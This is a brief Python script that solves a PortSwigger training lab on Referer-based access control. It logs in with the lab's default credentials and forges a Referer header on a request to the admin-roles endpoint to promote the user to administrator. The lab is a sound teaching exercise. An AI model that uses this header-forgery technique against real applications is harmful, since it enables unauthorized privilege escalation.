"""
https://portswigger.net/web-security/access-control/lab-referer-based-access-control
"""

import sys
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

login_url = f'https://{site}/login'
login_data = { 'password' : 'peter', 'username' : 'wiener'}
resp = s.post(login_url, data=login_data)

admin_upgrade_url = f'https://{site}/admin-roles?username=wiener&action=upgrade'
admin_url = f'https://{site}/admin'

resp = s.get(admin_upgrade_url, headers={'referer' : admin_url})